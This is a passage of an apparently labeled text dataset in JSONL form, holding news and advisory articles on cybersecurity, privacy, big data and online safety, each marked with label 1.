encrypted, you have lost any chance of recovering that data.\"\nLaw-abiding users, however, can let law enforcement officials and the courts worry about criminals’ phones. Instead, agencies deploying smart phones and tablets or allowing them as part of BYOD programs could take note of how well a good encryption program works.", "label": 1}
{"text": "WASHINGTON — Kids have easy and inexpensive access to hundreds of smartphone applications, but parents are in the dark about what personal information is being collected from their children and how companies are using the data, government regulators said Thursday.\nThe Federal Trade Commission said companies that make mobile apps, and the stores that sell them, should be providing parents with basic, simple-to-understand information about their products so they can choose which apps their children can use. The report also says developers should disclose whether their apps connect with social media services or include advertisements.\nMobile apps can automatically capture smartphone information, such as a person’s location, phone number, call logs and personal contacts.\nThe market for mobile apps has exploded over the past few years, according to the FTC. In 2008, there were about 600 apps available to smartphone users. Now there are hundreds of thousands that have been downloaded more than 28 billion times, the commission said.\n“This rapidly growing market provides enormous opportunities and benefits for app users of all ages, but raises questions about users’ privacy, especially when the users are children and teens,” the report by the FTC staff said.\nUsing the word “kids,” FTC staff searched online app stores and examined pages promoting apps for word games, math and number games, and entertainment. Most of the product descriptions stated that they were for use by children. Prices for the apps ranged from free to $9.99. “But most apps were $0.99 or less, and free apps were overwhelmingly the most frequently downloaded,” the report said.", "label": 1}
{"text": "ARCHIVED: Avoiding computer viruses\nComputer viruses implant instructions in other programs or storage devices and can attack, scramble, or erase computer data. The danger of computer viruses lies in their ability to replicate themselves and spread from system to system. Few computing systems are immune to infection.\nOn this page:\nThe following activities are among the most common ways of getting computer viruses. Minimizing the frequency of these activities will reduce your risk of getting a computer virus:\n- Freely sharing computer programs and system disks, or downloading\nfiles and software through file-sharing applications such as\nBitTorrent, eDonkey, and KaZaA\n- Clicking links in instant messaging (IM) that have no\ncontext or have only general text; for more information, see What should I do if my computer is infected with an instant messaging (IM) Trojan?\n- Downloading executable software from public-access bulletin boards\nor web sites\n- Using your personal disk space with public computers or other\ncomputers that are used by more than one person\n- Opening email attachments from people you don't know or without\nfirst scanning them for viruses; for more information, see ARCHIVED: Using Symantec/Norton AntiVirus Corporate Edition, how do I immediately scan a file, folder, or drive for viruses? and ARCHIVED: Using Norton AntiVirus for Mac OS or Mac OS X, how do I immediately scan a file, folder, or drive for viruses?\n- Opening any email attachment that ends in\n.lnkon a computer running Microsoft Windows (At Indiana University, UITS blocks certain attachments that commonly harbor viruses from being delivered via email; for more information, see At IU, what types of attachments are blocked from my email account?)\n- Continually running your Windows computer as an administrator; for more information, see ARCHIVED: In Windows, why should I avoid running my computer as an administrator?\nHow to avoid computer viruses\nFollowing are some recommendations for safe computing:\n- The most important thing you can do to keep your computer safe is\nto install virus detection software and keep the virus patterns up to\ndate. Antivirus programs perform two general functions: scanning for\nand removing viruses in files on disks, and monitoring the operation\nof your computer for virus-like activity (either known actions of\nspecific viruses or general suspicious activity). Most antivirus\npackages contain routines that can perform each kind of task.\nNote: The University Information Security Office (UISO) recommends that you run the latest version of Symantec virus protection software (available to IU students, faculty, and staff free of charge via IUware) for your operating system; See In Windows, how do I safely upgrade to the latest Symantec Endpoint or AntiVirus software? Be sure to upgrade safely, update your virus definitions daily, and scan your computer weekly. Check the software help for instructions.\n- Keep your operating system current with the latest\npatches and updates. The writers of viruses and\nworms often exploit bugs and security holes in operating\nsystems and other computer software. Software manufacturers frequently\nrelease patches for such holes. For information on obtaining the\nlatest patches, see ARCHIVED: For Windows, how can I get software updates and patches? and ARCHIVED: For Mac OS X, how do I obtain and install system software updates?\n- Back up your files. Viruses are one more very good reason to\nalways back up your files.\nNote: If you back up a file that is already infected with a virus, you can re-infect your system by restoring files from the backup copies. Check your backup files with virus scanning software before using them.\n- Keep your original application and system disks locked\n(write-protected). This will prevent the virus from spreading to your\n- If you must insert one of your application disks into an unknown\ncomputer, lock (write-protect) it first, and unlock your application\ndisk only after verifying that the machine is virus-free.\n- Obtain public-domain software from reputable sources. Check newly\ndownloaded software thoroughly using reputable virus detection\nsoftware on a locked floppy disk for any signs of infection before you\ncopy it to a hard disk. This can also help protect you from\nTrojan horse programs.\n- Quarantine infected systems. If you discover that a system is\ninfected with a virus, immediately isolate it from other systems. In\nother words, disconnect it from any network it is on and don't allow\nanyone to move files from it to another system. Once the system has\nbeen disinfected, you can copy or move files.\n- If you use a desktop version of Outlook, minimize use of the preview or reading pane feature.\nLast modified on August 30, 2010.", "label": 1}
{"text": "In the vast universe of IT, data is categorized as being either structured or unstructured, from a macro perspective. Generation of unstructured data is orders of magnitude higher than that generated in structured formats, and this poses major challenges in terms of storage and processing and analytics. Such large amounts of data collectively form what is known as big data, the handling of which is usually beyond the capability of traditional relational database management systems (RDBMS).\nAs RDBMS has been the preferred method for storing, warehousing, and analyzing structured data, the industry has matured in the analysis of mainly structured data. Ignoring unstructured data is inadvisable, as effective analytics is today a key business differentiator. Organizations are exploring all possible sources of data to develop intelligent big data analytics systems that can provide deeper insights for informed decision making.\nTechnologies such as Hadoop and specialized non-relational databases such as columnar databases, graph databases and document databases are being widely implemented to store and process unstructured big data for analytics. MapReduce is the distributed data processing and querying engine to extract data from big datasets hosted on compute clusters in any typical Hadoop implementation. Structured Query Language (SQL) has been the de-facto standard for querying data out of RDBMS systems.\nRDBMS systems are generally known to hold data spanning terabytes in any typical warehousing environments. But when systems hosting unstructured data come into picture, the size of the data would scale to a minimum of hundreds of petabytes, thus qualifying as big data. Currently, systems with structured and unstructured data are operated in mutually exclusive mode without any interoperability. Organizations need to explore and exploit the intelligence hidden in unstructured big data, with suitable big data analytics. Nevertheless, dependence on RDBMS for existing lines of business applications would continue. The challenge is to implement a big data analytics solution that can analyze structured as well as unstructured big data using a common interface.\nIntegrated heterogeneous data processing using SQL and MapReduce in parallel\nIn a consolidated view of big organizational data, the weightage of relational data is no more than a modest-sized source system, when compared with unstructured data. In the context of this growing need, vendors are enhancing MapReduce data processing engines that can provide operating interface extensions to access structured data from relational databases using SQL. RDBMS vendors are rolling out drivers for interoperability with Hadoop environments to bridge the connectivity between MapReduce and SQL.\nDue to conscious interoperability efforts made by MapReduce/Hadoop\nvendors, as well as RDBMS vendors, big data analytics over heterogeneous data is becoming a\nreality. Greenplum MapReduce is one example of the potential of big data analytics. A data flow engine driven by Greenplum’s MapReduce can\nquery big sets of unstructured data (petabyte-scale) using parallel computing as well as query\nstructured data from relational databases using JDBC / ODBC drivers. Technically, thus, all\nrelational databases that support JDBC / ODBC can be queried using this parallel data flow\nApplications of analytics over big heterogeneous data\nAs the nature of data in structured and unstructured formats is different, the kind of analysis that can be done over this data is also different. With integrated big data analytics capable of sourcing data from any big data sources, applications can extract the deepest level of intelligence from the entire organizational data.\nFor example, consider a manufacturing unit in the FMCG segment. In the regular course of business operations, it would have big data generated from procurement of commodities; product manufacturing; brand promotion and product marketing; direct and indirect sales; customer care; sales support centers, and so on. Suppose that this company is publicly listed. Sales, procurements, stock inventory, incidents, and service requests would all be in structured data formats. Quotation negotiations, detailed readings from manufacturing instruments, online logs of user clickstreams on product advertisements, users’ feedback requests, and grievances recorded with support centers, daily stock feeds from stock exchanges, would all be stored in unstructured formats. All this amounts to big data and requires big data analytics techniques.\nPattern recognition and gap analysis are the immediate value additions that big data analytics can extract from heterogeneous data. With all these data sources analyzable using a single big data analytics solution, complex data analytics is now possible. For instance, one can analyze how a particular resource has a cascading impact on manufacturing performance, sales performance, customer reactions, CRM costs, and finally fluctuation in stock value. This pattern recognition using time series analysis can help identify gaps in processes. Also, direct and indirect association and impact of various key parameters of different business operations can be analyzed when all the data sources that form the organizational data are analyzable with big data analytics. SQL and MapReduce are likely to become the preferred querying mechanism for such big data analytics.\nAbout the Author: Siddharth Mehta works as an associate manager and a technical architect for BI software projects at Accenture Services. He is a recipient of Microsoft’s Most Valuable Professional award, and has written extensively on Microsoft BI software on his blog. Prior to Accenture, Mehta was in Capgemini.\nThis was first published in August 2011", "label": 1}
{"text": "Spam and Phishing Emails\nPhishing emails are messages sent by individuals trying to \"fish\" for personal or financial information. Phishers are getting better every day at making their messages look authentic. There are two types of phishing emails:\n- Emails that ask you to reply to the message with confidential information, such as your user ID and password. Never respond to any email with confidential information. UH and other legitimate businesses will never ask for this information via email.\n- Emails that ask you to click on a link to a web page, which then asks you to provide confidential information. Many times these web pages look like legitimate sites, such as Bank of America or PayPal, but they are not. When you provide your user ID and password, this information is captured by the phisher, who can then use it to log into the legitimate site.\nWhat to do if you get a phishing email\n- Send any phishing emails you receive, including its full header information, to firstname.lastname@example.org.\n- If you suspect it may be a phishing email, UIT Security can review the message and advise if it is legitimate or not.\n- If you know it is a phishing email, UIT Security can take measures to have the phishing web site taken down.\n- Never respond to any email with confidential information. UH and other legitimate businesses will never ask for this information via email.\n- Use your mouse to hover over links in an email. This will show you the actual website you will be directed to if you click on the link. It is always best to type the address yourself into your web browser, rather than clicking a link in an email.\nHow to identify a phishing email\n- May show the sender on behalf of someone, such as the University of Houston and generally do not contain the sender's email.\n- May contain fuzzy logo symbols which are not genuine.\n- May not contain email signatures or any contact information.\n- May have bad grammar and capitalization.\n- Generally require you to take quick action, such as verifying your account to prevent it from being deactivated.\nBe particularly vigilant during holidays or significant events since attackers heighten their activity during these times.\nHow to Protect Yourself\nHere are some best practices that will help protect you and your information:\n- Beware of messages that claim your account has been suspended.\n- Be suspicious of any email with urgent requests for personal financial information.\n- Never click on a link in an email. Instead, always type the legitimate Web address of the site you want to reach directly into your Web browser.\n- Be suspicious of email messages and other electronic communications from sources you do not know or recognize\n- Use the latest versions of your operating system (OS) and applications.\n- Have the latest security software updates (patches) installed. This includes patches for your OS and applications.\n- Keep your anti-virus software up to date.\n- Report any suspicious emails", "label": 1}
{"text": "Google: A New Tool For U.S. Intelligence?http://www.npr.org/2011/03/25/134666365/a-new-tool-for-u-s-intelligence-google\nTraditionally, intelligence agencies have relied on top-secret information to track changes in other countries. But wiretaps and secret intercepts didn't help U.S. officials predict the Arab Spring that has brought revolution across the Middle East and North Africa.\nIn hindsight, officials say they could have found some clues about what was about to happen if they had read open sources more closely. Now they are searching for systematic ways to do that.\nThe uprisings in the region have shown intelligence officials that they need new ways to understand what motivates people around the world. While traditional intelligence tools can help, they are limited in their ability to put their fingers on the pulse of society or anticipate fickle human behavior.\n\"The traditional intelligence community is absolutely biased toward classified information,\" said Lt. Col. Reid Sawyer, an Army intelligence officer and head of West Point's Combating Terrorism Center. \"I think that open source provides a critical lens into understanding the world around us in a much more dynamic way than traditional intelligence sources can provide.\"\nOpen sources include newspapers, local radio shows and, of course, Facebook and Twitter. The problem, intelligence officials will tell you, is tapping into all of that in a systematic way.\nPredicting Political Unrest\nGabriel Koehler-Derrick, an instructor at West Point, and Joshua Goldstein, a researcher at Princeton University, think they may have at least a partial solution. They are seeing if they can tap into the mood of the country by tracking what its citizens are searching for online. And the way they do that is by using the search engine Google Trends.\n\"What we did was a comparison of search terms over time starting from the moment the Internet was plugged back in by the government of Egypt on Jan. 25, and moving forward for a period of about 30 days to see what we could find out,\" Koehler-Derrick says. As he saw it, it was an electronic way of taking a very broad poll.\nGoogle Trends is basically a way of looking at what people are focusing on by mapping out their Google searches. Marketing firms have been using Google Trends for some time. The government has, too. Back in 2009, during the swine flu epidemic in the U.S., the National Institutes of Health used Google Flu Trends to track outbreaks of the disease.\nIt turns out that when people started to feel feverish and nauseous, they would go to Google to check out their symptoms. While it wasn't a perfect indicator, Google Flu Trends often beat government predictions about flu outbreaks by a week or more. Imagine using the Internet to do the same thing in predicting political unrest.\nUnderstanding The Mood Of A Country\n\"Google Trends allows us to get a sense of atmospherics,\" Koehler-Derrick says. \"There are approximately 16 million Internet users in Egypt. Now, this is undoubtedly a demographic that is biased toward younger people. If you put Google's market share at 10 percent, which I think is absurdly low, then that is 1.6 million users that we have essentially surveyed for 30 days.\"\nHe and Goldstein searched Google using Arabic because that would better measure what locals are interested in. Using the search term \"Tunis,\" they wanted to see how many Egyptians were following the demonstrations in Tunisia. They compared the number of Google searches for \"Tunis\" with the number of Google searches for pop stars in Egypt.\n\"Typically, as I think you'd find in the United States, pop stars trump almost any search you can think of,\" Koehler-Derrick says. \"But the search for Tunis prior to the demonstrations that kicked off in late January were surprisingly high.\"\nSawyer says this kind of information is vital to understanding the mood of a country and would supplement the kind of information gleaned from more traditional intelligence methods.\nConsider the debate raging in Washington, D.C., about the Muslim Brotherhood as the revolution unfolded in Egypt, he says. There were concerns in the U.S. intelligence community that the Muslim Brotherhood, an Islamic political group, might come to power.\n\"If the decision makers could have understood how little the Muslim Brotherhood was animating the online searches inside of Egypt,\" Sawyer continued, \"how might it have led to different decisions or different discussions, at least, that were being held in the halls of Washington?\"\nIn other words, few seemed interested enough in the Muslim Brotherhood to search for them on Google. So how much of a role could the group have been playing in day-to-day conversations in Egypt?\nStill, Google Trends can't predict the future. But it could be one more tool for intelligence officials who want to tap into the private conversations that could spark popular movements.", "label": 1}
{"text": "Proactive parents and teachers can help keep kids safe online\n(BPT) - If your teen is among the 93 percent of 12- to 17-year-olds using your family’s laptop, smartphone or tablet to surf the Internet, they are vulnerable to multiple cyber threats, many of which could be detrimental.\nMoreover, teens do not realize the abundance of threats awaiting them, nor do they recognize a tweet or photo upload can impact not only their reputation and future, but their safety, as well. Microsoft’s research shows that 55 percent of teens say they give little or no thought to the consequences of posting something online.\nAnd, according to a recent survey, 1 in 4 parents are overwhelmed by technology and just hope for the best.\n“As hackers continue plotting attacks, the increase in vulnerability among teens is likely, but parents may not realize they are actually the first line of defense in keeping their families safe online,” says Linda McCarthy, cyber security expert, former senior director of Internet safety at Symantec and author of Own Your Space: Keep Yourself and Your Stuff Safe Online.\nThe increase in prospective cyber threats provides opportunities in the career field of cyber security. If your teen enjoys spending time online, it’s never too early to begin discussing the education required to enter this field.\nCyber security related fields are projected to grow more than 28 percent by 2020, according to the U.S. Bureau of Labor Statistics. DeVry University, which has partnered with McCarthy to provide complimentary copies of the Own Your Space eBook to parents, teachers and teens, recognizes the growing need for professionals with the skills required to protect individuals and organizations from cyberattacks. By also partnering with technology leaders like Cisco and Microsoft, its students are provided with a mix of relevant theoretical and hands-on education.\nFor concerned parents and teachers, McCarthy offers the following advice to help protect teens online:\n1. Protect equipment. Install and update antivirus software, spyware protection and firewalls.\n2. Realize social networking sites are here to stay. Review your teen’s Facebook and Twitter profiles. Make sure they do not display personal information such as full names, addresses or school names.\n3. Boost password strength. Utilize a mixture of letters, numbers and characters. And most importantly, never share passwords with anyone.\nCyber security is a moving target, and as threats develop daily, it’s imperative for parents and teachers to educate teens about these dangers. “The goal is to inform and educate teens, not scare them about the dangers of sharing information online,” says McCarthy. “By protecting your family’s devices and empowering teens with the information needed to recognize impending threats, cyber sabotage is avoidable.”\nTo download a complimentary copy of Linda McCarthy’s eBook, Own Your Space: Keep Yourself and Your Stuff Safe Online, visit DeVry.edu/OwnYourSpace.", "label": 1}
{"text": "SQL Injection and Oracle, Part Two\nDecember 4, 2002[From SecurityFocus]\nSQL Injection is a way to attack the data in a database through a firewall protecting it. It is a method by which the parameters of a Web-based application are modified in order to change the SQL statements that are passed to a database to return data. For example, by adding a single quote (') to the parameters, it is possible to cause a second query to be executed with the first.\nSQL injection techniques are an increasingly dangerous threat to the security of information stored upon Oracle Databases. These techniques are being discussed with greater regularity on security mailing lists, forums, and at conferences. There have been many good papers written about SQL Injection and a few about the security of Oracle databases and software but not many that focus on SQL injection and Oracle software.\nThis is the second part of a two-part article that will examine SQL injection attacks against Oracle databases. The first installment offered an overview of SQL injection and looked at how Oracle database applications are vulnerable to this attack, and looked at some examples. This segment will look at enumerating the privileges, detecting SQL injection attacks, and protecting against SQL injection.\nThe complete article is available at http://online.securityfocus.com/infocus/1646.", "label": 1}
{"text": "\"Hammered asinine requirements\": Now there’s a secure password\n- — 24 January, 2013 18:08\nYoure best off forgetting your grammar lessons when it comes to creating passphrases, according to new research out of Carnegie Mellon University and MIT.\nThe researchers say that using grammar good or bad can clue in hackers about the words in a multi-word password. And theyve built an algorithm as a proof-of-concept to show it (The team, led by software engineering Ph.D. student Ashwini Rao of CMUs Institute for Software Research, will present its research at the Association for Computing Machinerys Conference on Data and Application Security and Privacy on Feb. 20 in San Antonio.).\nThe team tested its grammar-aware password cracking algorithm against 1,434 passwords containing 16 or more characters, and cracked 10% of the dataset via the algorithm.\nWe should not blindly rely on the number of words or characters in a password as a measure of its security, Rao said, in a statement.\nThe researchers say that while a password based on a phrase or short sentence can be easier for a user to remember, it also makes it simpler to crack because grammatical rules narrow word choices and structures (in other words, a passphrase with pronoun-verb-adjective-noun would be easier to crack than one made up of noun-verb-adjective).\nThe researchers found that Hammered asinine requirements, for instance, is harder to crack than even the longer and seemingly clever Th3r3 can only b3 #1!\nPasswords in general have come under increasing fire by security pros, as some of the highest profile breaches (LinkedIn, Nvidia) have been the result of password compromises or resulted in passwords (including encrypted ones) being made public.\nGoogles security team is looking into ways to avoid passwords altogether for logging into websites.\nRead more about wide area network in Network World's Wide Area Network section.", "label": 1}
{"text": "WASHINGTON — A series of problems with electronic voting machines has raised fresh questions about election technology as newer computerized systems gain ground for the 2012 US election.\nAs many as 25 percent of Americans are expected to use paperless electronic voting machines in the upcoming November elections, according to the Verified Voting Foundation, but confidence has been eroded by incidents showing vulnerabilities.\nThe foundation, which seeks more reliable election systems, contends that voting machines in 11 states are all-electronic, with no paper systems for recounts, and that many other jurisdictions have some of these systems in place.\nLast year, Microsoft Research published a paper describing vulnerabilities to what had been described as \"fully verifiable\" direct recording electronic (DRE) systems in which a hacker can \"undetectably alter large numbers of votes.\"\nSeparately, scientists at Argonne National Laboratory described a way to tamper with certain electronic voting machines by inserting a $10 component along with a $15 radio frequency device to alter vote results.\nPamela Smith of the Verified Voting Foundation said these incidents highlight the fact \"that you can have insider challenges as well as outsider hacks. It points out that you have to be able to check the system.\"\nElection security and technology has been an issue in the United States since the 2000 president election marred by \"hanging chads\" in Florida that muddled the result.\nUS laws enacted since then encourage the use of new technology including touch-screen ballots. But some critics say these can be vulnerable to hackers and that some lack a \"paper trail\" which could allow a recount in case of machine failure.\n\"We still have a number of states which do not have what I call resilient recountable systems,\" Smith said.\n\"If they do have problems they may not be able to recover from them. So we would like states to move to recoverable systems where they could do a recount if there were a problem.\"\nLast September, researchers led by Roger Johnston at the Argonne lab were able to change votes on the a ballot machine using about $25 worth of equipment, by inserting a device to manipulate touch screens by remote control\n\"We believe these 'man in the middle attacks' are possible on a wide variety of voting machines,\" with little technical expertise, Johnston said.\nIn October, Microsoft Research released a paper describing a so-called \"trash attack\" which it said could be \"effective against the majority of fully verifiable election systems.\"\nIt is known as a trash attack because it would allow a corrupt elections worker, for example, see a voter dumping a receipt on the way out from a polling station, and then modify the vote without detection, and with no way to verify the original vote. Microsoft also offered a technical fix for this weakness.\nDan Wallach, a Rice University computer scientist, said little has changed since reports about vulnerabilities in voting machines began around 2007.\n\"Anybody trying to compromise them could have read all the public reports in 2007 and now, five years later, they've had lots of time to engineer attacks,\" Wallach said.\nWallach said it is not clear if any elections have been compromised by computer intrusions: \"We don't know. If they were doing it and were doing it skillfully, we'd never know.\"\nOther countries have faced similar issues. The Netherlands scrapped electronic voting several years ago after a high-profile hacking incident. Ireland also abandoned the use of Dutch-made voting machines. Controversies have arisen over security of voting machines in India and several other countries.\nRichard Soudriette, president of the Colorado-based Center for Diplomacy and Democracy, said it was \"unfortunate that electronic voting systems have taken on such a negative connotation.\"\n\"I think it is entirely possible to build trustworthy and verifiable systems. But there has been so much negative publicity about electronic voting, I don't think it's going to make a revival.\"\nCharles Stewart, a political scientist at the Massachusetts Institute of Technology and faculty member of the Voting Technology Project of MIT and the California Institute of Technology, said he is \"more comfortable than most people\" with the new systems, while acknowledging that any system can be vulnerable.\n\"I trust my computer scientist friends when they tell me all the ways you can hack into the machines,\" he said. \"But I've yet to see an election hacked.\"\nStewart that if the 2012 presidential race is a runaway, few will notice any flaws in vote technology. But if it is a tight race, \"I can easily imagine in a state like Ohio or Florida or Pennsylvania, if there are one or two counties where things go wrong, that could raise this issue again.\"\nCopyright © 2013 AFP. All rights reserved. More »", "label": 1}
{"text": "More business transactions occur electronically every year, and organizations are retaining a growing volume of sensitive data. For many organizations, data has become an invaluable asset — the lifeblood of their operations. Access to this data is available to an expanding user base, including employees, business partners, suppliers and customers. IT infrastructures are more extensive, more complex, more distributed — and more accessible.\nThis interconnectedness affords many benefits for businesses, government agencies and consumers alike — but it also potentially introduces a great deal of risk. The more access points an organization maintains, the greater the possibility of compromised systems or data theft.\nTo help secure their data, companies have generally focused much of their efforts on protecting themselves from threats from outside of the organization. However, a growing wave of data losses caused by human error and fraud from within the organization illustrate the degree of risk to companies and government agencies. And the stakes are high — especially as repositories of private information expand.\nGrowing public concern over the security and privacy of personal data has placed many companies and government agencies in the spotlight — and countries around the world are developing regulations designed to support confidentiality.\nIn a recent global business security report, IBM identified a burgeoning trend toward small, targeted insider attacks — rather than sweeping global threats such as worms, spam, viruses and other malware. Insider attacks can be a significant threat to the security and privacy of data.", "label": 1}
{"text": "For most people, the web browser is central to what you do on your computer. Companies are increasingly putting more and more services on the web and are encouraging their customers online. Securing your web browser is a vital part of surfing the web safely and keeping your computer free of viruses, spyware and other threats.\nMost people own a computer which runs Microsoft Windows XP or other variants of the Windows operating system. This means that by default most people use Microsoft’s Internet Explorer browser and therefore hackers focus their efforts on finding vulnerabilities in this program.\nThe most important step you can take to securing your web browser is to make sure that the version you are using is the most current version and has all the latest patches or updates installed. Hackers exploit vulnerabilities in the software to steal personal information and take control of your computer. Make sure that automatic updates are switched on and that you immediately install any updates you are prompted to download.\nGiven the well documented issues with Internet Explorer it is worth considering an alternative browser like Mozilla Firefox or the Opera Desktop Browser. You will still need Internet Explorer for some sites, however due to the increased popularity of the Firefox browser most sites now work with both Internet Explorer and Firefox as standard. Both alternatives pack some impressive features liked tabbed browsing which Microsoft is only just catching up on. Switching browser does not mean that you are 100% secure but there is currently a much reduced likelihood of being impacted by security issues.\nRegardless of what web browser you use a lot of information about your surfing habits is stored on your computer. Common items include the URLs or web pages you visit, files which have been downloaded, “Cookie” files which websites put on your computer and parts of the web pages you have viewed. It is therefore good practice to scrub this information on a regular basis. You can do this manually through your browser’s Options menu or use a free software tool like CCleaner which is highly recommended.\nThe good news is that the computer security industry is developing some great new products and services to help you protect yourself online. There appears to be an increasing emphasis on developing tools which help prevent your computer being infected in the first place.\nA good example of this is a web browser plug-in called “SiteAdvisor” which was recently bought by McAfee.\nSiteAdvisor gives each website it visits a red, yellow or green rating based on various tests it carries out. These ratings then conveniently appear next to search results in Google and other search engines. This helps users determine whether a website is safe to visit. Anti-spyware tools like Webroot’s Spy Sweeper and PC Tools’ Spyware Doctor also include sophisticated active protection features as standard.\nRichard Rogers runs a number of computer-related sites offering Spyware Remover and Anti Virus Software help.\nArticle Source: http://EzineArticles.com/?expert=Richard_Rogers", "label": 1}
{"text": "More than 300 Web sites are being pestered by infected computers that are part of the Pushdo botnet, according to security researchers.\nThe U.S. Federal Bureau of Investigation, Twitter and PayPal are among the sites being hit, although it doesn't appear the attacks are designed to knock the sites offline, said Steven Adair, of The Shadowserver Foundation, a group that tracks botnets.\nShadowserver was tipped off to the Pushdo issue by Joe Stewart, director of malware analysis at vendor SecureWorks Inc.\nPushdo, which is also known as Pandex or Cutwail, has been around for about three years, according to a report from Trend Micro Inc. (OTC:TMICY). Computers infected with Pushdo are used to send out spam, but the malware is capable of downloading other harmful code to a computer.\nPusho appears to have been recently updated to cause computers infected with it to make SSL (Secure Sockets Layer) connections to various Web sites. SSL is an encrypted protocol used to protect information exchanged.\nThe bots start to create an SSL connection and then disconnect, a process that is repeated, Adair said. Serving up SSL connections puts more of a burden on a Web site than HTTP connections, Adair said, but the traffic has been so sporadic that some large Web sites didn't even notice.\n\"Despite how noisy it is, the traffic is still too infrequent and not large enough to really be seen as what we would think is an intentional DDOS attack,\" Adair said in an e-mail exchange. \"Much smaller botnets are capable of generating far more traffic and causing more of an impact to Web sites than what is being done with Pushdo.\"\nThe traffic, however, is significant and results in large Web sites getting millions of hits across hundreds of thousands of IP (Internet Protocol) addresses. \"This might be a big deal if you're used to only getting a few hundred or thousands of hits a day or you don't have unlimited bandwidth,\" Adair wrote on Shadowserver's blog.\nOne option for Web sites is to change their IP addresses, but that may only be a temporary fix. \"We have also had numerous people write in offering assistance and feedback on ways to slow or stop these attacks,\" Adair said. \"We hope to put out an updated post that can help our system administrators associated with these Web sites soon.\"", "label": 1}
{"text": "McKinsey & Company released a report last year titled BigData: TheNextFrontierforInnovation, Competition, andProductivity. One of the conclusions in this often-quoted analysis is that Government has the potential to see a larger benefit from the use of Big Data than any other economic sector except Finance and Insurance.\nIn part 1a of this blog, I’ll address, at a very high level, what makes Big Data different from the data of ten years ago and why Big Data solutions unlock new approaches to turning data into information and information into knowledge that can be acted upon.\nIn part 1b, I’ll offer practical examples of how government can leverage the Big Data techniques being aggressively exploited in the commercial world.\nIn Part Two, we’ll take a look at the technology stack for Big Data, frequently referred to as the SMAQ stack: Storage, MapReduce and Query. I will also answer the question that you’ve wanted to ask: Why is Pig Latin the key to the SMAQ stack?\nIn Part Three, we’ll cover the array of Big Data products and services that DLT Solutions offers in partnership with Oracle, RedHat, NetApp, QuestSoftware, Google, Informatica, Quantum, SoleraNetworks, and Amazon. Big Data GPS products from our vendor partner TomTom will be covered in Part 1.\nWhat is Big Data and how is it different from my data?\nAlthough there is no ‘industry standard’ definition for Big Data, it is generally referred to as data that has one or more of the following characteristics that contrast with the data you typically use:\nVolume – multiple terabytes or petabytes.\nVelocity – streaming input from ‘always on’ sensors, continuous video feeds, and social media sources like Twitter or Facebook.\nVariety – multiple file types, unstructured text in a wide range of formats from a range of sources, structured data from databases and spreadsheets mixed with unstructured data.\nWith the exception of government agencies involved in intelligence collection or major science projects, few have had to solve Big Data problems. However, Google and Yahoo have approached the problem from non-traditional perspectives and developed parallel processing techniques that can be employed on computing grids locally or in the Cloud. Open source software for these techniques have been formalized and brought to market by companies such as Cloudera and Hortonworks . Additionally, in the past 2-3 years, many major software brands have specialized in addressing one or more aspects of Big Data solutions. Selection of components for your Big Data solution, however, will include several issues that you would not normally address in selecting a specific Relational Database Management System RDBMS. More about that in part two.\nWhat is the value of Big Data?\nBig Data solutions are all about identifying valuable information in large datasets of varying quality. Big Data techniques do well at detecting information in low signal-to-noise ratio environments. One analyst’s noise may be another analyst’s gold nugget. For example, if an agency maintains for internal dissemination only the (unstructured) news articles about itself, the agency may miss learning of relevant, innovative solutions developed by a state agency or foreign government agency working on a closely related problem. Since the information sought by any one analyst today may be very different from that sought by another analyst in a month’s time, inexpensive Big Data storage solutions enable the enterprise to keep all data versus only the subset initially perceived to have value.\nAnd it’s not just about storing and searching large amounts of static data. Mining streaming social media for real-time information on disease outbreaks, for example, can provide critical public health data that may save lives.\nNow that I’ve summarized the basic Big Data concepts, part 1b will take a close look at some ways that Big Data might be exploited in the public sector.\nShare this article!", "label": 1}
